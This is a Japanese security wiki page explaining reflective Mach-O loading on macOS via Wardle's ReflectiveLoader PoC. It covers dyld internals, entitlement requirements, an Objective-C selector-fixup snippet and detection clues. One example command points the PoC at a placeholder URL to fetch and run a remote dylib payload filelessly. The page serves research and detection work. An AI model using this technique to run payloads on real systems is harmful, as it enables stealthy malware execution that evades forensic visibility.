# macOSでのReflective Mach-O Loading

{{#include ../../../banners/hacktricks-training.md}}

Reflective loaderは、自身のプロセス内にすでにあるバイト列からMach-Oイメージをマッピングし、ペイロードファイルを開くようシステムローダーに要求せずにリンクして初期化子を実行します。これは**プロセス内コード実行**であり、権限昇格やリモートプロセスへのインジェクションを行うプリミティブではありません。<sup>[[2]](#references)</sup>

最近のmacOSでは、従来の`NSCreateObjectFileImageFromMemory`/`NSLinkModule`の処理経路は、イメージをディスクに書き込みます。ReflectiveLoaderは、代わりに旧バージョンのApple dyldローディングコードを組み込んでいます。WardleはこれをmacOS 15および26で実証しました。<sup>[[2]](#references)[[3]](#references)</sup>

ローダーがHardened Runtimeを使用する場合、署名されていないインメモリコードには、`com.apple.security.cs.allow-unsigned-executable-memory`や`com.apple.security.cs.disable-executable-page-protection`などの実行可能メモリの例外が必要です。そうでない場合、コード署名の強制によって実行がブロックされます。これはローダーの署名に関する制約であり、権限昇格のプリミティブではありません。[macOSのentitlementsリファレンス](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory)を参照してください。<sup>[[2]](#references)</sup>

PoCでは、生のMach-O **bundle、framework、またはdylib**を提供するURLを指定します。その`main.mm`は、空のダウンロードを拒否し、`LC_DYLD_CHAINED_FIXUPS`を使用するペイロードはサポートされていないと明記しています。ローカルのパス名も受け付けますが、この入力ではfilelessな処理にはなりません。URL形式では、バイト列を`NSData`に読み込み、そのバッファと長さを`custom_dlopen_from_memory`に渡します。<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

埋め込みローダーは`ImageLoaderMachO::instantiateFromMemory`を呼び出し、続いて`image->link`を実行します。Objective-Cメタデータの登録は、コンストラクタを実行する`image->runInitializers`の前、リンク後に行われます。<sup>[[5]](#references)</sup> 登録しない場合、Objective-Cメッセージを送信するコンストラクタは`unrecognized selector sent to instance`エラーで失敗することがあります。<sup>[[3]](#references)</sup> [dyldの通常のイメージ読み込みフロー](macos-library-injection/macos-dyld-process.md#flow)と、[Mach-Oセクションのリファレンス](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections)を参照してください。

## Objective-Cメタデータの有効化

通常のdyld読み込みとは異なり、古いimage loaderを埋め込んでも、ペイロードのObjective-Cメタデータが`libobjc`で自動的に使用可能になるわけではありません。<sup>[[3]](#references)</sup> LLVM JITの手法を応用した方法では、マッピング済みの`__DATA`および`__DATA_CONST`にあるObjective-Cセクションを走査し、コンストラクタの実行前に次の手順を行います。<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. `__objc_selrefs`を`sizeof(SEL)`単位で走査します。null以外の各セレクタについて、`sel_getName`で名前を取得し、それを`sel_registerName`に渡して、セクション内のポインターを正規の`SEL`に置き換えます。
2. `__objc_classlist`からクラスを収集し、スーパークラスの依存関係を先に解決したうえで、`objc_readClassPair`を使って登録します。
3. `__objc_classrefs`と`__objc_superrefs`の参照を、登録済みクラスまたはメタクラスに書き換え、`__objc_catlist`からカテゴリメソッドをアタッチします。

たとえば、`ObjCRuntime.cpp`にあるセレクタの修復処理は、次の処理に相当します。<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

PoCはObjective-Cランタイムの内部動作に依存しており、すべてのMach-O形式の機能に対応しているわけではないため、その登録コードは汎用的なドロップインローダーではなく、実装の参考例です。<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> ペイロードが定義するクラスだけでなく、参照されるAppleのクラスやメソッドについても登録が必要です。<sup>[[3]](#references)</sup>

リフレクティブにロードされたイメージは、著者のテストでは`dyld_all_image_infos`に現れません。代わりに、匿名の実行可能マッピングが`vmmap`で名前のない`dylib`領域として表示されることがあり、サンプリングされたフレームは`<unknown binary>`と表示される場合があります。これらは調査の手がかりであり、このローダーによるものだと確実に特定できるものではありません。また、別のプロセスのタスク情報へのアクセスは、entitlementによって制限されます。プロセスへのアクセス制約については、[macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md)を参照してください。<sup>[[3]](#references)</sup>

## References

- [1] [macOSでのLLVM JIT、Objective-C、Swift：知識のまとめ](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [macOSでのReflective Code Loadingの復元（Part I）](https://objective-see.org/blog/blog_0x7C.html)
- [3] [macOSでのReflective Code Loadingの復元（Part II）](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
